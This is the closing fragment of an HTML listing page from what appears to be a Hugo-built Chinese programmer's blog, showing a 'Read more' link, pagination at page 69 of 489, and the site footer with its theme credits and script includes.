		<a class="list__footer-readmore btn" href="/posts/e08160910398d2bd70c9e5111fdcbc59/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/68/">«</a>
	<span class="pagination__item pagination__item--current">69/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/70/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>